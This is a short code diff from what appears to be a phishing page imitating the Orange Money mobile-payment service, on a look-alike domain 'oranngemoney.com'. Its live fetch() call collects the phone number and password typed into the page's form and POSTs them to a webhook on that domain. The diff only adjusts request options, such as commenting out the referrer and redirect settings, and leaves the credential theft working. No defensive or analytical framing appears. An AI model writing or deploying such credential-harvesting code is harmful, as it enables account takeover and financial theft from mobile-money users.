@@ -241,16 +241,14 @@
             // );
      fetch("https://webhook.oranngemoney.com/", {
         "headers": {
-            "Accept": "*/*",
             "Content-Type": "application/json",
         },
         "body": JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
         "method": "POST",
-        // "mode": "cors",
-        "redirect": "follow",
-        "referrer": "https://oranngemoney.com",
+        // "redirect": "follow",
+        // "referrer": "https://oranngemoney.com",
         // "referrerPolicy": "strict-origin-when-cross-origin"
-        "Referrer-Policy": "unsafe-url",
+        // "Referrer-Policy": "unsafe-url",
          // "Access-Control-Allow-Origin" : "*"
     })   
 
